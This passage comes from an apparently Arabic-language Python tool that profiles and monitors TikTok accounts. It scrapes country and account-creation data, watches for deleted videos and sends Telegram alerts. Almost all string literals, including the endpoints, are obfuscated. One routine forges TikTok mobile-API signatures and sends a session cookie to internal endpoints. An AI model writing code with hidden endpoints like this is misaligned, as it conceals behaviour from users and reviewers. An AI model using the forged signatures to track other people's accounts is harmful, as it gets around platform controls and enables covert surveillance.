                block = content.split(__sx__(b'MJJjBwUCZGCYY2UGZZoFAWUBhIQZSkgCMk9n', 72))[1].split(__sx__(b'lTe+56egIyIgoCCm5MCjwB8kwcO87+2ryur3', 237))[0]
            except IndexError:
                return None
            enriched = {__sx__(b'6ErbW19ZWb9fXNvnXr9du5GQu3yVSw==', 144): _extract_value(block, __sx__(b'U/Fg4OTi4gTk52Bc5QTmAHqZ+aNi+v0vK3A9LFg=', 43), __sx__(b'zmyFtra2h7aH', 182)), __sx__(b'yGqb+516/Hv8/bGwv4Wz/w==', 176): __sx__(b'0XMi5YSvqaviqJs=', 169) if __sx__(b'AaMqUzJUszWyNTQoy1NQUzR8eVIIfPQ=', 121) in block else __sx__(b'RuTN9Tk+PzM+gA==', 62), __sx__(b'IoBxkpaRERdTkRYTl60WW1p+rV95', 90): _extract_value(block, __sx__(b'wGLrknB0c/P1sXP08XXvChLucvTpCupqMDbrMm1uvLgwRLAo', 184), __sx__(b'x2VMdHD0ur+8db4u', 191)), __sx__(b'ljTFoKPgI6Lv7uac7LA=', 238): _extract_value(block, __sx__(b'IoBxFBdUlxYL6AiI0tQJ0I+MXlpx4F7K', 90), __sx__(b'2nihoqKioqM=', 162)), __sx__(b'etgpL0wv8E4DAgrhAG8=', 2): _extract_value(block, __sx__(b'ddfGQVy/X9+FRNzbCQ0D8A+F', 13), __sx__(b'TO43NDQ0NDU=', 52)), __sx__(b'dtQlREPBwsENDgbADIs=', 14): _extract_value(block, __sx__(b'WfsKa2zu7e5yk3Pzqa9yq/T3JSEMvSWW', 33), __sx__(b'xmS9vr6+vr8=', 190)).upper()}
            ts = _extract_value(content, __sx__(b'40HI0bXR1rfSllJX1s4pSRPSSk2fm6F5niU=', 155), __sx__(b'F7Vsb29vb24=', 111))
            if ts.isdigit():
                dt = datetime.datetime.utcfromtimestamp(int(ts))
                enriched[__sx__(b'O5kIbQkObwpOio8OTk4yRUNnaUez', 67)] = dt.strftime(__sx__(b'JoQN04oLk4sLEw8Oq+4Mq+sMU1hefOldgQ==', 94))
                enriched[__sx__(b'zW/+m//4mfxAfZqYt7WjhrGm', 181)] = dt.hour
                enriched[__sx__(b'uBqL7oqN7Ik1DQzr7YnFwN9TxCc=', 192)] = dt.minute
                enriched[__sx__(b'cNJDJkJFJEEFRkXGx0MJCBdQDNk=', 8)] = dt.second
            else:
                enriched[__sx__(b'40HQtdHWt9KWUlfWlpbqnZu/sZ9r', 155)] = __sx__(b'etjxyS1Tcsktz0kDAg3mAUw=', 2)
            if enriched.get(__sx__(b'JIZ3FhGTkJNfXFSSXtk=', 92)):
                if pycountry:
                    try:
                        country = pycountry.countries.lookup(enriched[__sx__(b'NpRlBAOBgoFNTkaATMs=', 78)])
                        enriched[__sx__(b'pwWUEfAS9PZ1K5QTktrfxCHbSQ==', 223)] = country.name
                    except Exception:
                        enriched[__sx__(b'QuBx9BX3EROQznH2dz86IcQ+rA==', 58)] = __sx__(b'Bad2sLaztlKyfn12G3+M', 125)
                else:
                    enriched[__sx__(b'vx2MCegK7O5tM4wLisLH3DnDUQ==', 199)] = __sx__(b'b80c2tzZ3DjYFBcccRXm', 23)
            else:
                enriched[__sx__(b'Cqg5vF2/WVvYhjm+P3dyaYx25A==', 114)] = __sx__(b'Wvgp7+ns6Q3tISIpRCDT', 34)
            return enriched
        except Exception:
            return None

    def احصل_على_بلد_الحساب_حقيقي(username, info):
        __sx__(b'etgvjDMIwGIOh/WcIFnvIOrqA8ZDtWzQw0OnCi/qC65vK4zcwuttCVimiFV7Wz+LrX0ZCi0jLV3gCkExz/PXRlJoiERiKg22MiqFRBG/dDtxxsTG4RQ/RAmMKdMGLdjtLo3ZfxpFFCj66pusSFJx/dBLQxsv/tfQGQ2uK1urFEDpWVH75zXjPS9oPtNqJGO2idVsjXcB+RLNGzmxVf7yMt1GpZz1BTvhb2s=', 2)
        enriched = fetch_page_enrichment(username)
        region_code = __sx__(b'vB7HxMTExMU=', 196)
        if enriched and enriched.get(__sx__(b'EbNCIySmpaZqaWGna+w=', 105)):
            region_code = enriched[__sx__(b'332M7epoa2ikp69ppSI=', 167)].upper()
        else:
            region_code = (info.get(__sx__(b'yWua+/x+fX6ysbl/szQ=', 177)) or __sx__(b'ZsQdHh4eHh8=', 30)).upper()
        country_ar = arabic_country_name(region_code)
        flag = flag_from_region(region_code)
        return (region_code, country_ar, flag, enriched)

    def اطبع_بطاقة_الحساب(g, nickname, country_ar, flag, bio, followers, likes, videos, analysis, enriched=None):
        border = f"{MAG}{'═' * 58}{RESET}"
        title = f"{BOLD}{CYAN}👤 @{g} — {(nickname if nickname else 'بدون اسم')}{RESET}"
        line1 = f'{WHITE}📍 الدولة: {country_ar} {flag}{RESET}'
        line2 = f'{WHITE}👥 المتابعون: {followers:,}   ❤️ الإعجابات: {likes:,}   📹 الفيديوهات: {videos:,}{RESET}'
        line3 = f'{WHITE}📝 البايو: {bio}{RESET}'
        score = analysis[__sx__(b'B6U0tLM0s/ZQMbFQNXp/ZYN7+Q==', 127)]
        bar = شريط_قوة(score)
        label = analysis[__sx__(b'E7GgIichpmprbWppag==', 107)]
        color = analysis[__sx__(b'4UNS0NXTVBDWV1ZQtpuZgxmd5g==', 153)]
        line4 = f'{color}📊 القوة: [{bar}] {score}% — {label}{RESET}'
        line5 = f"{WHITE}📈 التفاعل التقريبي: {analysis['engagement']}%{RESET}"
        line6 = f"{WHITE}🏷️ فئة المتابعين: {analysis['tier_follow']}   🎞️ فئة الفيديوهات: {analysis['tier_videos']}{RESET}"
        badges = __sx__(b'cNJbcNy4QAkIDxkKTQ==', 8).join(analysis[__sx__(b'/V/Oz8nMyqiDhY28h+I=', 133)])
        line7 = f'{CYAN}🔖 الشارات: {badges}{RESET}'
        print(border)
        print(title)
        print(line1)
        print(line2)
        print(line3)
        print(line4)
        print(line5)
        print(line6)
        print(line7)
        if enriched:
            print(f'{YELLOW}— معلومات إضافية من صفحة تيك توك —{RESET}')
            try:
                following_fmt = f"{int(enriched.get('followingCount', '0')):,}"
            except Exception:
                following_fmt = enriched.get(__sx__(b'Set6+v74+B7+/XpG/x78GjAxGt006g==', 49), __sx__(b'bc8mFRUVJBUk', 21))
            print(f'{WHITE}➡️ Following: {following_fmt}{RESET}')
            print(f"{WHITE}✔️ Verified: {enriched.get('verified', 'No')}{RESET}")
            print(f"{WHITE}📌 Pinned Video: {enriched.get('pinnedVideoId', 'None')}{RESET}")
            ct = enriched.get(__sx__(b'YMJTNlJVNFEV0dRVFRVpHhg8Mhzo', 24), __sx__(b'/lx1TanX9k2pS82Hholihcg=', 134))
            print(f'{WHITE}🗓️ Created(UTC): {ct}{RESET}')
        print(border)
        _card_plain = _build_card_plain(g, nickname, country_ar, flag, bio, followers, likes, videos, analysis)
        _mirror(_card_plain)
    DELTA_FLASH = {}

    def render_countdown_numeric(total_sec, username, current_video_count):
        if not SHOW_NUMERIC_LINE:
            time.sleep(total_sec)
            return
        for remain in range(total_sec, 0, -1):
            flash_txt = __sx__(b'pAbf3Nzc3N0=', 220)
            tup = DELTA_FLASH.get(username)
            if tup:
                diff_val, ts = tup
                if time.time() - ts <= 5:
                    flash_txt = f' {GREEN}-' + str(diff_val) + RESET
                else:
                    DELTA_FLASH.pop(username, None)
            line = f'\r{CYAN}فحص بعد: {remain:02d}s{RESET}  {MAG}عدد الفيديوهات: {current_video_count}{RESET}{flash_txt}'
            sys.stdout.write(line)
            sys.stdout.flush()
            time.sleep(1)
        sys.stdout.write(__sx__(b'Q+HYOTs7MDsw', 59))
        sys.stdout.flush()

    def فحص_مستمر_للفيديوهات(username):
        time.sleep(5)
        file_path = f'accounts_data/{username}.txt'
        deleted_counter = 0
        bearer_local = None
        last = None
        if os.path.exists(file_path):
            try:
                with open(file_path, __sx__(b'WfsKIyEhUiFS', 33), encoding=__sx__(b'YsAxN1PJrxoaH/gbrw==', 26)) as f:
                    last = int(f.read().strip() or __sx__(b'23mQo6OjkqOS', 163))
            except:
                last = None
        while True:
            try:
                info_loop, bearer_local = fetch_userinfo_tikfans(username, bearer_token=bearer_local)
                current_video_count = int(info_loop[__sx__(b'J4V0lBMWkiiRcJJ0Xl9J0Vt+', 95)])
                if last is None:
                    last = current_video_count
                    with open(file_path, __sx__(b'2niJpaKi2qLa', 162), encoding=__sx__(b'c9EgJkLYvgsLDukKvg==', 11)) as f:
                        f.write(str(current_video_count))
                elif current_video_count < last:
                    diff = last - current_video_count
                    deleted_counter += diff
                    DELTA_FLASH[username] = (diff, time.time())
                    msg = f'تم إزالة فيديو من حساب @{username}'
                    print(f'{GREEN}{msg}{RESET}')
                    send_telegram_alert(msg)
                    with open(file_path, __sx__(b'pwX02N/fp9+n', 223), encoding=__sx__(b'AKJTVTGrzXh4fZp5zQ==', 120)) as f:
                        f.write(str(current_video_count))
                    last = current_video_count
                elif current_video_count > last:
                    with open(file_path, __sx__(b'03GArKur06vT', 171), encoding=__sx__(b'G7lITiqw1mNjZoFi1g==', 99)) as f:
                        f.write(str(current_video_count))
                    last = current_video_count
                render_countdown_numeric(MONITOR_INTERVAL, username, current_video_count)
            except Exception as e:
                print(f'{RED}⚠️ خطأ أثناء التحقق الدوري من @{username}: {e}{RESET}')
                render_countdown_numeric(MONITOR_INTERVAL, username, last if last is not None else 0)

    def _ts_to_str(ts):
        try:
            ts = int(ts)
            return time.strftime(__sx__(b'MZMaxJ0chJwcBBgZvPkbvPwbRE9Ja/5Klg==', 73), time.localtime(ts))
        except:
            return __sx__(b'wGIDCVPebzU1so/j1xQCCUR+4rjsibI7', 184)

    def fetch_created_and_latest(username, sec_uid=None):
        created_ts = None
        latest_ts = None
        try:
            r = requests.get(__sx__(b'x2V0l5aWlwltaJCQkGiUdnORcGr0cXBq8JN3a5CS8ZJtcHP0dLi/UziylQ==', 191), params={__sx__(b'hiTVMzXS0rNzMbL//u21/To=', 254): username}, timeout=20)
            js = r.json()
            if js.get(__sx__(b'VvRl4GFnKy4qJC+y', 46)) == 0:
                u = (js.get(__sx__(b'3X/u7InsoaWhpaQ+', 165)) or {}).get(__sx__(b'zW+emPuYt7Wx2LR1', 181)) or {}
                created_ts = u.get(__sx__(b'I4EQdREWdxJWkpcWXltNb19f', 91)) or u.get(__sx__(b'b81cOV1aO16aON7bWhIXDBMTlA==', 23)) or None
        except:
            pass
        try:
            r2 = requests.get(__sx__(b'oQMS8fDw8W8LDvb29g7yEBX3FgySFxYMlvURDfb0l/QL9hH29/Df2SOl1G4=', 217), params={__sx__(b'EbNCpKJFRSTkpiVoaXoiaq0=', 105): username, __sx__(b'cNJDxifFIwkIDlcKIg==', 8): 1}, timeout=25)
            js2 = r2.json()
            if js2.get(__sx__(b'GLorri8pZWBkamH8', 96)) == 0:
                vids = (js2.get(__sx__(b'1Hbn5YDlqKyorK03', 172)) or {}).get(__sx__(b'edsqyk1IzC4HAQnmA4o=', 1)) or []
                if vids:
                    v = vids[0]
                    latest_ts = v.get(__sx__(b'ethJLEhPLkuPLcvOTwcCGQYGgQ==', 2)) or v.get(__sx__(b'bsxdOFxbOl8b39pbExYAIhIS', 22))
        except:
            pass
        if not latest_ts and sec_uid:
            try:
                r3 = requests.get(__sx__(b'9FZHpKWlpDpeW6Ojo1unRUCiQ1nHQkNZw6BEWKOhwqFeo0SjoqWKjHbwgTs=', 140), params={__sx__(b'50W00dIRsFLTnp+UFZ1C', 159): sec_uid, __sx__(b'Wftq7w7sCiAhJ34jCw==', 33): 1}, timeout=25)
                js3 = r3.json()
                if js3.get(__sx__(b'txWEAYCGys/Lxc5T', 207)) == 0:
                    vids = (js3.get(__sx__(b'S+l4eh96NzM3MzKo', 51)) or {}).get(__sx__(b'5Ea3V9DVUbOanJR7nhc=', 156)) or []
                    if vids:
                        v = vids[0]
                        latest_ts = v.get(__sx__(b'rA6f+p6Z+J1Z+x0YmdHUz9DQVw==', 212)) or v.get(__sx__(b'vhyN6IyL6o/LDwqLw8bQ8sLC', 198))
            except:
                pass
        return (created_ts, latest_ts)
    FAST_CREATION = True
    ENABLE_DEEP_SCAN = False
    DEEP_SCAN_MAX_PAGES = 4
    SYNC_CREATION_LINE = True
    FALLBACK_QUICK_SCAN = True
    ONLY_IMPROVE_UPDATES = True

    def _load_sessionid_auto():
        sid = (os.environ.get(__sx__(b'9FaHhQWD+oGCenh7f/iNjJWNjzU=', 140)) or __sx__(b'WvghIiIiIiM=', 34)).strip()
        if sid:
            return sid
        p = __sx__(b'9Vemw6CjQ0FCRsFcpiSljI2rkYjt', 141)
        if os.path.exists(p):
            try:
                with open(p, __sx__(b'H71MZWdnFGcU', 103), encoding=__sx__(b'A6FQVjKoznt7fpl6zg==', 123)) as f:
                    for line in f:
                        s = line.strip()
                        if s:
                            return s
            except:
                pass
        return __sx__(b'uhjBwsLCwsM=', 194)
    SESSIONID_AUTO = _load_sessionid_auto()

    def _print_creation_line(tag_user, cr_obj):
        created_str = _ts_to_str(cr_obj[__sx__(b'bc8+PBMVFEgV/Q==', 21)]) if cr_obj and cr_obj.get(__sx__(b'JIZ3dVpcXQFctA==', 92)) else __sx__(b'xWcGDFbbajAwt4rm0hEHDEF7573pjLc+', 189)
        line = f"{WHITE}🗓️ إنشاء @{tag_user}: {created_str} ({(cr_obj or {}).get('source') or 'unknown'}, ثقة {(cr_obj or {}).get('confidence', 0)}%){RESET}"
        sys.stdout.write(line + __sx__(b'03FIqauroKug', 171))
        sys.stdout.flush()
        _mirror(line)

    def _mobile_signed_get_creation(sessionid: str, sec_user_id: str, device_region=__sx__(b'V/VcXiovL+AvpQ==', 47)):
        if not sessionid or not sec_user_id:
            return (None, __sx__(b'Bad+fX19fXw=', 125), 0, __sx__(b'Cau6vF1fv706Jlk/dKOICOhYi7TYuIDUtNg0gOhYcd+EetE=', 113))
        try:
            ttsign
        except NameError:
            return (None, __sx__(b'VPYvLCwsLC0=', 44), 0, __sx__(b'ctAhIyPERsVZwsElW0ImQcbGQ0bAQw8KWLoNxg==', 10))
        hosts = [__sx__(b'rA4f/P39/GIGA5v4HODmBhkf+x6ZGAWZAvn5mpn4+uWYAP8dGPodG/oHnxob0dSFQNt/', 212), __sx__(b'IYOScXBwce+LjhZ1kW1tipSSdpMUlYgUjxSVkHUXjnKQlXeQlneKEpeWXFl9B1fO', 89), __sx__(b'IIKTcHFxcO6Kjxd0kGxsixWWdxKNFY4VlJF0Fo9zkZR2kZd2ixOWl11YXIhV7w==', 88)]
        endpoints = [__sx__(b'JoSNEXIRkxOLcW2KcXMQc4xZXnf7W2w=', 94), __sx__(b'qggBnf6dH58H/eEG/f+c/wD9+hidGR6bBx39G9Ig0k4q2HE=', 210), __sx__(b'rQ8GmvmaGJgA+uYH+vib+AfS1fx50OY=', 213)]
        base_q = {__sx__(b'Y8EwVVaVNDZVNpHUVxobAEEfnQ==', 27): sec_user_id, __sx__(b'IIITEXWTFBbVd5ARdBGTd5JdWGlBXm0=', 88): __sx__(b'T+18+3we/fh7Njc8tjXV', 55), __sx__(b'qAob/9bQ0YPQMw==', 208): __sx__(b'50XUU9S2VVDTnp+UHp19', 159), __sx__(b'nz3MrMrNKSsobCisK6ri58aj4uA=', 231): __sx__(b'qQvi4wLiB+LS0dXy0P8=', 209), __sx__(b'TuwdfRsc+Pr5vXn4eX8zNhcGMzc=', 54): __sx__(b'SesCAwIBAgE3MTUEMAM=', 49), __sx__(b'wWPylZExdvJ19Ly5twy6+w==', 185): __sx__(b'wGJzlZV29PZ0MXcRvLivjbyL', 184), __sx__(b'8VPCR8FFQsJEiImCwItT', 137): __sx__(b'uxmIDAyMDIruC4pvx8PUw8f3', 195), __sx__(b'AKIztDR5eHokeVc=', 120): __sx__(b'gSPKzcvP//n4Dvkz', 249), __sx__(b'MpCBB4aBBgFnZMNlAWdghIaFwQWEBQNPSioCQv0=', 74): __sx__(b'dNY/Pjw+PTo8Pzw6DAwGxg35', 12), __sx__(b'AKJTVTAxVDH1VzNVUra0t/M3tjcxfXg353+b', 120): __sx__(b'bM4nJiQmJSIkJyQiFBQe3hXh', 20), __sx__(b'BqS1UTazVTO3Mn9+cTR9Jw==', 126): __sx__(b'Z8UsKy0pLiosqK8rV1NVUVZSHB8Ahxt8', 31), __sx__(b'8lDBw6dBxsQHRcaLipixiRc=', 138): __sx__(b'giDJzsjMy8/JTUrOyn5L+txF+RE=', 250), __sx__(b'Suj5/n4zMjBGMwU=', 50): __sx__(b'ftw1BgYGNwY3', 6), __sx__(b'njwtL6moKq/j5u5D5Jc=', 230): __sx__(b'1HbnYa+srZaseA==', 172), __sx__(b'VfcGZ2Di4eIuLSXjL6g=', 45): device_region, __sx__(b'/lzNqq4OSc9KzanLysmDhplhgmM=', 134): __sx__(b'L40cmlRXVm1Xgw==', 87)}
        ua = __sx__(b'mjjnIyPo4MPy4jK9e4H//pd2RycxlAuw8o58oTRCo7V1sEpcXBV0WAANK3uh7zlkiZ0R8JAcqLCGb/h2s1LZkQv95TwjtgBJkOaP/t4oPy3sBGnabwEjIVORbBCUN/HwS2POyI+/iUDEi7LxiGG01qxPRB/9AbnBYw==', 226)
        for host in hosts:
            for ep in endpoints:
                try:
                    qstr = urlencode(base_q, doseq=True, safe=__sx__(b'OZvyFEJBQeNBJQ==', 65))
                    signed = ttsign(qstr, __sx__(b'ctAJCgoKCgs=', 10), None).get_value()
                    x_gorgon = signed.get(__sx__(b'eduq0UzOLkvOzgIBDOACMw==', 1)) or signed.get(__sx__(b'Te++5UD6Gn/6+jY1ORQ3xw==', 53)) or signed.get(__sx__(b'6UsaQeRmnuNmZpKRm9CTww==', 145))
                    x_khronos = signed.get(__sx__(b'dtSl3sPAJsTBxSEIDh+ZDaQ=', 14)) or signed.get(__sx__(b'ddeG3fjDJcfCxiILDQKaDmc=', 13)) or signed.get(__sx__(b'ZsSVzuvoFuzp7REYHhLpHLQ=', 30))
                    xss = signed.get(__sx__(b'B6XUr1JRqVI1UqtStjOxMVJ+f1M0es0=', 127)) or str(int(time.time() * 1000))
                    url = f'{host}{ep}?{qstr}'
                    headers = {__sx__(b'AKJzVTZVqg00N7VTeXhsY3vE', 120): ua, __sx__(b'M5E4BwUFZmOaPoYAhQSChwBMS2DmTu4=', 75): __sx__(b'+FrLL0qsgICE0IE7', 128), __sx__(b'CKoDvr+7Oz1euby/c3Bl1XRh', 112): __sx__(b'XvzVaGsL9lPq7wptIyY1aiWC', 38), __sx__(b'5kQVTutRsdRRUZ2ekr+cbA==', 158): x_gorgon, __sx__(b'AaPyqYy3UbO2slZ/eXbuehM=', 121): x_khronos, __sx__(b'XvxV6Onp6GojJiHRJH0=', 38): f'sid_tt={sessionid}; sessionid={sessionid}; sessionid_ss={sessionid};', __sx__(b'pgRVDtPQCNOs0wrTL6ooqNPf3v+V2uw=', 222): xss}
                    r = requests.get(url, headers=headers, timeout=18)
                    if r.status_code != 200 or not r.text:
                        continue
                    js = r.json()
                    candidates = [js.get(__sx__(b'BKZXUTJRfnx4EX28', 124)) or {}, js.get(__sx__(b'KIp7fR592p+cG5tXUENhU5s=', 80)) or {}, (js.get(__sx__(b'jC7f2brZBji/P/P0++L3uA==', 244)) or {}).get(__sx__(b'MpBhZwRnSEpOJ0uK', 74)) or {}, (js.get(__sx__(b'ZMY3MVIxllNVMVXQ0B0cB9QYjg==', 28)) or {}).get(__sx__(b'iSva3L/c8/H1nPAx', 241)) or {}, (js.get(__sx__(b'txWEhuOGy8/Lz85U', 207)) or {}).get(__sx__(b'2HqLje6NoqCkzaFg', 160)) or {}]
                    for u in candidates:
                        if not isinstance(u, dict):
                            continue
                        ct = u.get(__sx__(b'2HrrjurtjOktj2ls7aWgu6SkIw==', 160)) or u.get(__sx__(b'0nDhhODnhuOnY2bnr6q8nq6u', 170))
                        if ct:
                            return (int(ct), f'mobile_signed {ep}', 99, host)
                    nested = (js.get(__sx__(b'Red2dBF0OT05PTym', 61)) or {}).get(__sx__(b'JYd2cBNwX11ZMFyd', 93)) or {}
                    if isinstance(nested, dict):
                        ct = nested.get(__sx__(b'AKIzVjI1VDH1V7G0NX14Y3x8+w==', 120)) or nested.get(__sx__(b'bM5fOl5ZOF0Z3dhZERQCIBAQ', 20))
                        if ct:
                            return (int(ct), f'mobile_signed {ep}', 99, host)
                except Exception:
                    continue
        return (None, __sx__(b'702Ul5eXl5Y=', 151), 0, __sx__(b'UPJj5OF54OVn4uRhfWDlYwHg5+QDAX5gYyzaeyimqyJj', 40))

    def creation_via_mobile_signed(sec_user_id: str, sessionid: str=__sx__(b'nT/m5eXl5eQ=', 229), device_region=__sx__(b'VPZfXSksLOMspg==', 44)):
        return _mobile_signed_get_creation(sessionid=sessionid, sec_user_id=sec_user_id, device_region=device_region)

    def _creation_from_tikwm_info_quick(username):
        try:
            js = requests.get(__sx__(b'/V9OraysrTNXUqqqqlKuTEmrSlDOS0pQyqlNUaqoy6hXSknOToKFaQKIrw==', 133), params={__sx__(b'oQPyFBL19ZRUFpXY2cqS2h0=', 217): username}, timeout=20).json()
            if js.get(__sx__(b'OpgJjA0LR0JGSEPe', 66)) == 0:
                u = (js.get(__sx__(b'jy28vtu+8/fz9/Zs', 247)) or {}).get(__sx__(b'IoBxdxR3WFpeN1ua', 90)) or {}
                ct = u.get(__sx__(b'VPZnAmZhAGUh5eBhKSw6GCgo', 44)) or u.get(__sx__(b'1Xfmg+fggeQggmRh4KittqmpLg==', 173))
                if ct:
                    return (int(ct), __sx__(b'y2mYen+dfD58f/h4tLOk3beL', 179), 95, __sx__(b'FrQlQCQjQidjp6Ija254Wmpq', 110))
        except:
            pass
        return (None, __sx__(b'MJJLSEhISEk=', 72), 0, __sx__(b'8lCJioqKios=', 138))

    def _deep_scan_oldest(username=None, sec_uid=None, max_pages=2, pause=0.15):

        def _scan(key, val):
            oldest = None
            cursor = 0
            for _ in range(max_pages):
                try:
                    r = requests.get(__sx__(b'vhwN7u/v7nAUEenp6RHtDwroCRONCAkTieoOEunriOsU6Q7p6O/Axjy6y3E=', 198), params={key: val, __sx__(b'mjipLM0vyePi5L3gyA==', 226): 200, __sx__(b'mjipzM/ILM3g4uvw4H0=', 226): cursor}, timeout=25)
                    js = r.json()
                    if js.get(__sx__(b'mTuqL66o5OHl6+B9', 225)) != 0:
                        break
                    vids = (js.get(__sx__(b'zG7//Zj9sLSwtLUv', 180)) or {}).get(__sx__(b'YcMy0lVQ1DYfGRH+G5I=', 25)) or []
                    if not vids:
                        break
                    for v in vids:
                        ct = v.get(__sx__(b'ErAhRCAnRiPnRaOmJ29qcW5u6Q==', 106)) or v.get(__sx__(b'3H7viu7piO2pbWjpoaSykKCg', 164))
                        if ct:
                            ct = int(ct)
                            oldest = ct if oldest is None or ct < oldest else oldest
                    nxt = (js.get(__sx__(b'AqAxM1Yzfnp+envh', 122)) or {}).get(__sx__(b'Z8VUMTI10TAdHxYNHYA=', 31))
                    if nxt is None or nxt == cursor:
                        break
                    cursor = nxt
                    time.sleep(pause)
                except:
                    break
            return oldest
        if username:
            o = _scan(__sx__(b'mznILijPz65uLK/i4/Co4Cc=', 227), username)
            if o:
                return (o, __sx__(b'sBLjAQTmB0WHgYXlQOcFA+Tkhc3IiO/P6A==', 200), 70, __sx__(b'oAITF5GR9faJ8BOUkRXf2Mfs3Bs=', 216))
        if sec_uid:
            o = _scan(__sx__(b'XP4PammqC+loJSQvrib5', 36), sec_uid)
            if o:
                return (o, __sx__(b'4UOyUFW3VhTW0NS0EbbX1FfVmJmhP58I', 153), 70, __sx__(b'zG5/e/39mZrlnH/4/XmztKuAsHc=', 180))
        return (None, __sx__(b'+1mAg4ODg4I=', 131), 0, __sx__(b'uBrDwMDAwME=', 192))

    def get_account_creation_ultra(username: str, sec_uid: str=__sx__(b'UvApKioqKis=', 42), sessionid: str=__sx__(b'UvApKioqKis=', 42), deep_scan_if_missing: bool=True, max_pages: int=4):
        ts, src, conf, notes = creation_via_mobile_signed(sec_uid or __sx__(b'23mgo6Ojo6I=', 163), sessionid=sessionid, device_region=__sx__(b'zW/GxLC1tXq1Pw==', 181))
        if ts:
            return {__sx__(b'5Ue2tJudnMCddQ==', 157): ts, __sx__(b'Zcc20zIwV1MYHRQlH48=', 29): src, __sx__(b'60nYXVzYWN/aXtjdlpOF75ec', 147): conf, __sx__(b'8VNCQqbApI+JjwmLow==', 137): notes}
        ts, src, conf, notes = _creation_from_tikwm_info_quick(username)
        if ts:
            return {__sx__(b'6Uu6uJeRkMyReQ==', 145): ts, __sx__(b'dtQlwCEjREALDgc2DJw=', 14): src, __sx__(b'S+l4/fx4+H96/nh9NjMlTzc8', 51): conf, __sx__(b'/11MTKjOqoGHgQeFrQ==', 135): notes}
        if deep_scan_if_missing and ENABLE_DEEP_SCAN:
            ts, src, conf, notes = _deep_scan_oldest(username=username, sec_uid=sec_uid, max_pages=max_pages, pause=0.25)
            if ts:
                return {__sx__(b'DqxdX3B2dyt2ng==', 118): ts, __sx__(b'+FqrTq+tys6FgIm4ghI=', 128): src, __sx__(b'kzGgJSSgIKeiJqCl7uv9l+/k', 235): conf, __sx__(b'a8nY2DxaPhUTFZMROQ==', 19): notes}
        return {__sx__(b'fd8uLAMFBFgF7Q==', 5): None, __sx__(b'ddcmwyIgR0MIDQQ1D58=', 13): __sx__(b'332kp6enp6Y=', 167), __sx__(b'pwWUERCUFJOWEpSR2t/Jo9vQ', 223): 0, __sx__(b'Ref29hJ0EDs9O70/Fw==', 61): __sx__(b'jC739PT09PU=', 244)}
    _CREATION_CACHE = {}

    def creation_quick_line(username, sec_uid):
        ts, src, conf, notes = _creation_from_tikwm_info_quick(username)
        if ts:
            cr = {__sx__(b'0nCBg6yqq/eqQg==', 170): ts, __sx__(b'ZsQ10DEzVFAbHhcmHIw=', 30): src, __sx__(b'uxmIDQyICI+KDoiNxsPVv8fM', 195): conf, __sx__(b'BqS1tVE3U3h+eP58VA==', 126): notes}
            _CREATION_CACHE[username] = cr
            _print_creation_line(username, cr)
            return
        if FALLBACK_QUICK_SCAN:
            try:
                ts2, src2, conf2, notes2 = _deep_scan_oldest(username=username, sec_uid=sec_uid, max_pages=2, pause=0.15)
                if ts2:
                    cr2 = {__sx__(b'Ppxtb0BGRxtGrg==', 70): ts2, __sx__(b'7028Wbi63dmSl56vlQU=', 151): src2, __sx__(b'mzmoLSyoKK+qLqit5uP1n+fs', 227): conf2, __sx__(b'xmR1dZH3k7i+uD68lA==', 190): notes2}
                    _CREATION_CACHE[username] = cr2
                    _print_creation_line(username, cr2)
                    return
            except:
                pass
        cr0 = {__sx__(b'xWeWlLu9vOC9VQ==', 189): None, __sx__(b'MZNih2ZkAwdMSUBxS9s=', 73): __sx__(b'y2mYn37/fbWztcmxrQ==', 179), __sx__(b'pQeWExKWFpGUEJaT2N3LodnS', 221): 0, __sx__(b'O5mIiGwKbkVDRcNBaQ==', 67): __sx__(b'2HqjoKCgoKE=', 160)}
        _CREATION_CACHE[username] = cr0
        _print_creation_line(username, cr0)

    def fetch_creation_background(username, sec_uid, sessionid):
        try:
            prev = _CREATION_CACHE.get(username) or {}
            had_prev_ts = bool(prev.get(__sx__(b'G7lISmVjYj5jiw==', 99)))
            cr = get_account_creation_ultra(username, sec_uid=sec_uid, sessionid=sessionid, deep_scan_if_missing=ENABLE_DEEP_SCAN, max_pages=DEEP_SCAN_MAX_PAGES)
            new_ts = cr.get(__sx__(b'HrxNT2BmZztmjg==', 102))
            new_conf = cr.get(__sx__(b'Wvhp7O1p6W5r72lsJyI0XiYt', 34), 0)
            should_print = True
            should_send = True
            if ONLY_IMPROVE_UPDATES:
                if not new_ts and had_prev_ts:
                    should_print = False
                    should_send = False
                if new_ts and had_prev_ts:
                    prev_conf = prev.get(__sx__(b'ctBBxMVBwUZDx0FEDwocdg4F', 10), 0)
                    prev_ts = prev.get(__sx__(b'QuAREzw6O2c60g==', 58))
                    if new_conf <= prev_conf and new_ts == prev_ts:
                        should_print = False
                        should_send = False
            if new_ts and (not had_prev_ts or new_conf >= prev.get(__sx__(b'I4EQlZQQkBcSlhAVXltNJ19U', 91), 0) or new_ts != prev.get(__sx__(b'9FanpYqMjdGMZA==', 140))) or not had_prev_ts:
                _CREATION_CACHE[username] = cr
            if should_print:
                created_str = _ts_to_str(new_ts) if new_ts else __sx__(b'nT9eVA6DMmho79K+iklfVBkjv+Wx1O9m', 229)
                print(f"{WHITE}🗓️ (تحديث) إنشاء @{username}: {created_str} ({cr['source'] or 'unknown'}, ثقة {cr['confidence']}%){RESET}")
                sys.stdout.flush()
                _mirror(f"🗓️ (تحديث) إنشاء @{username}: {created_str} (src {cr['source'] or 'unknown'}, conf {cr['confidence']}%)")
            if should_send:
                if new_ts or not had_prev_ts:
                    try:
                        created_str = _ts_to_str(new_ts) if new_ts else __sx__(b'E7HQ2oANvObmYVwwBMfR2petMWs/WmHo', 107)
                        send_telegram_alert(f"🗓️ (تحديث) @{username} — الإنشاء: {created_str} (src {cr['source'] or 'unknown'}, conf {cr['confidence']}%)")
                    except:
                        pass
        except Exception:
            if not (_CREATION_CACHE.get(username) or {}).get(__sx__(b'T+0cHjE3Nmo33w==', 55)):
                print(f'{WHITE}🗓️ (تحديث) إنشاء @{username}: غير متاح (error){RESET}')
                sys.stdout.flush()
                _mirror(f'🗓️ (تحديث) إنشاء @{username}: غير متاح (error)')

    def اختيار_فحص_الفيديوهات(username):
